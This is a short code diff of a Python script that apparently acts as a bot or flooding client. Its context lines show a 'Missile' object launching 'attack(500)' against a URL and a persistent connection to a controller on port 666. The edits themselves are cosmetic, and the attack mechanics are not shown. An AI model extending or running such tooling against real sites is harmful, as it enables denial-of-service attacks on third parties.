@@ -173,7 +173,6 @@ if __name__ == "__main__":
         missile = Missile(root=root, url=url, loop=loop)
         root_status = await missile.attack(500)
         return root_status
-    
     def bordered(text):
         sentences = text.splitlines()
         hor = max(len(line) for line in sentences) + 2
@@ -209,7 +208,7 @@ if __name__ == "__main__":
     while True:  # Persistent Connection
         try:
             root.connect((root_ip, 666))
-            print(f"Connected to {root_ip}:{666}!")
+            print(f"Connected to {root_ip}:666!")
             break
         except (
             ConnectionRefusedError,
